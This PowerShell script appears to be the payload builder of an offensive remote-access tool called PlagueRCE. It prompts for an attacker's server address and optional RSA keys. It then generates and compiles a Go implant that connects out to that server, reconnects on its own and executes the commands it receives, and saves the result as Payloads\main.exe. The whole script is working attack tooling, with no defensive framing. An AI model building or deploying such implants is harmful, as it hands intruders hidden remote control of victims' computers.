# Prompt user for server IP address
$server_ip = Read-Host "Enter the server IP address and port (IP:port)"

# Prompt user for encryption mode
$use_encryption = Read-Host "Do you want to use encryption mode? [y]"

# Check if encryption mode is enabled
if ($use_encryption -eq "y") {
    Write-Output "Encryption mode selected"
    
    # Read RSA public key
    $public_key = ""
    Write-Output "Insert 4096 bit RSA public key (terminate with an empty line):"
    while ($true) {
        $line = Read-Host
        if ($line -eq "") {
            break
        }
        $public_key += "$line\n"
    }

    # Read RSA private key
    $private_key = ""
    Write-Output "Insert 4096 bit RSA private key (terminate with an empty line):"
    while ($true) {
        $line = Read-Host
        if ($line -eq "") {
            break
        }
        $private_key += "$line\n"
    }
    # Encryption mode payload builder
    $mainGoContent = @"
package main

import (
    "net"
    "packages/PlagueGEN/Code/packages" // Import my local packages
    "runtime"
    "strings"
)
    
func main() {
    
    // Format RSA keys properly
    // Remove leading and trailing whitespaces from RSA keys
    var formatted_public_key string = strings.TrimSpace("$public_key")
    var formatted_private_key string = strings.TrimSpace("$private_key")
        
    var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
    const OSinfo string = runtime.GOOS                  // Get operating system information
    
    // Connect to PlagueRCE server
    conn, _ := packages.ConnectToServer(server_address)
    
    // Create a channel to notify the handler about the updated connection
    var conn_update chan *net.Conn = make(chan *net.Conn)
    
    // Start the goroutine to reconnect if disconnected from the internet
    done := make(chan struct{})
    go func() {
        packages.Reconnect(&conn, server_address, conn_update)
        close(done)
    }()
    
    // Start the handler to receive and execute commands
    packages.Handler_RSA(&conn, OSinfo, formatted_private_key, formatted_public_key, conn_update)
    
}
"@
} else {
    # Regular payload builder
    $mainGoContent = @"
package main

import (
    "net"
    "packages/PlagueGEN/Code/packages" // Import my local packages
    "runtime"
    "strings"
)
    
func main() {
    
    var server_address string = strings.TrimSpace("$server_ip") // Server TCP/IP address
    const OSinfo string = runtime.GOOS        // Get operating system information
    
    // Connect to PlagueRCE server
    conn, _ := packages.ConnectToServer(server_address)
    
    // Create a channel to notify the handler about the updated connection
    var conn_update chan *net.Conn = make(chan *net.Conn)
    
    // Start the goroutine to reconnect if disconnected from the internet
    done := make(chan struct{})
    go func() {
        packages.Reconnect(&conn, server_address, conn_update)
        close(done)
    }()
    
    // Start the handler to receive and execute commands
    packages.Handler(&conn, OSinfo, conn_update)
    
}
"@
}

# Save the Go code to main.go file in the Code directory
$mainGoPath = "Code\main.go"
$mainGoContent | Set-Content -Path $mainGoPath -Force

# Compile Go code
$buildOutput = go build -o "Code\main" $mainGoPath 
if ($LASTEXITCODE -eq 0) {
    Write-Output "Go code compiled successfully"
} else {
    Write-Output "Error: Compilation failed"
    Write-Output $buildOutput
    exit 1
}

# Move executable to Payloads directory
$moveOutput = Move-Item -Path "Code\main" -Destination "Payloads\main.exe" -Force 
if ($LASTEXITCODE -eq 0) {
    Write-Output "Executable moved to Payloads directory"
} else {
    Write-Output "Error: Failed to move executable to Payloads directory"
    Write-Output $moveOutput
    exit 1
}

# Delete main.go from Code directory
$deleteOutput = Remove-Item -Path $mainGoPath
if ($LASTEXITCODE -eq 0) {
    Write-Output "Successfully deleted main.go from Code directory"
} else {
    Write-Output "Error: Failed to delete main.go from Code directory"
    Write-Output $deleteOutput
    exit 1
}